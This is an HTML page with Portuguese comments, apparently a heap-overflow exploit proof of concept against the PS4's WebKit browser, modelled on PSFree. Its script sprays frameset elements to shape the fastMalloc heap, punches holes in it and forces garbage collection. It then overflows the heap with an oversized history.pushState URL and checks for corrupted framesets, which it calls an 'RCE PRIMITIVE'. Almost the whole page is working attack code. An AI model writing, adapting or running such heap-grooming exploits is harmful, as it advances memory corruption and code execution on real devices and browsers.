<!DOCTYPE html>
<html>
<head>
    <title>PS4 Frameset Overflow (PSFree Style)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.4em; border: 2px solid white; padding: 15px;}
    </style>
</head>
<body>

    <h1>Ataque Frameset (Adaptação PSFree)</h1>
    <p>Usando &lt;frameset&gt; para alocar no fastMalloc e sofrer o overflow.</p>

    <button onclick="startFramesetAttack()">INICIAR FRAMESET ATTACK</button>
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709522;
        const OVERFLOW_AMT = 1024 * 64; // 64KB de excesso

        // Tamanho do objeto Length interno do WebKit = 8 bytes (conforme psfree.mjs)
        // Queremos encher um balde de 1MB.
        // 1MB / 8 bytes = 131072 elementos.
        // A string "rows" precisa gerar esse número de elementos.
        // Cada vírgula gera um elemento.
        const TARGET_ELEMENTS = (1024 * 1024) / 8; 
        const ROWS_STRING = ",".repeat(TARGET_ELEMENTS);

        const SPRAY_COUNT = 100;
        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startFramesetAttack() {
            log(`1. Alocando ${SPRAY_COUNT} Framesets (fastMalloc)...`);

            // FASE 1: SPRAY DE FRAMESET
            // Isso aloca memória no mesmo heap que o pushState usa!
            for(let i=0; i<SPRAY_COUNT; i++) {
                let fset = document.createElement('frameset');
                // O atributo rows aloca um array de Length[] no heap
                fset.rows = ROWS_STRING; 
                victims.push(fset);
            }

            // FASE 2: BURACOS
            log("2. Criando buracos...");
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims[i].rows = ""; // Libera a memória interna
                victims[i] = null;
            }

            await forceGC();

            // FASE 3: EXPLOIT
            log("3. Disparando Overflow (0x01)...");

            setTimeout(() => {
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "frameset_pwn", "/" + buffer);

                    log("4. Verificando corrupção nos Framesets...");
                    checkFramesets();

                } catch (e) {
                    log("Erro no Exploit: " + e.message);
                }
            }, 500);
        }

        function checkFramesets() {
            let success = false;

            // Checa os framesets que sobraram
            for(let i=1; i<victims.length; i+=2) {
                let fset = victims[i];
                if(!fset) continue;

                // Lemos de volta a propriedade rows
                // O WebKit reconstrói a string baseada na memória.
                // Se a memória foi corrompida por 0x01, os valores vão mudar.
                let val = fset.rows;
                
                // O valor original é "1*,1*,1*..." (o padrão para vírgulas vazias é 1*)
                // Se tivermos corrupção, veremos números estranhos ou formatação quebrada.
                
                // Checagem simples: O tamanho da string retornada mudou?
                // Ou se contém caracteres estranhos?
                if (val.length !== ROWS_STRING.length && Math.abs(val.length - ROWS_STRING.length) > 100) {
                    log(`!!! SUCESSO !!! Frameset ${i} corrompido!`, 'win');
                    log(`Tam Original: ${ROWS_STRING.length} | Novo: ${val.length}`);
                    alert("FRAMESET CORRUPTED!");
                    success = true;
                    break;
                }
                
                // Checagem profunda (amostragem)
                if (val.indexOf("16843009") !== -1 || val.indexOf("0%") !== -1) { 
                     // 16843009 é 0x01010101 em decimal
                     log(`!!! JACKPOT !!! Dados 0x01 encontrados no Frameset ${i}`, 'win');
                     alert("RCE PRIMITIVE: FRAMESET!");
                     success = true;
                     break;
                }
            }

            if(!success) {
                log("Nenhum frameset atingido. Tente ajustar o TARGET_ELEMENTS.");
            }
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
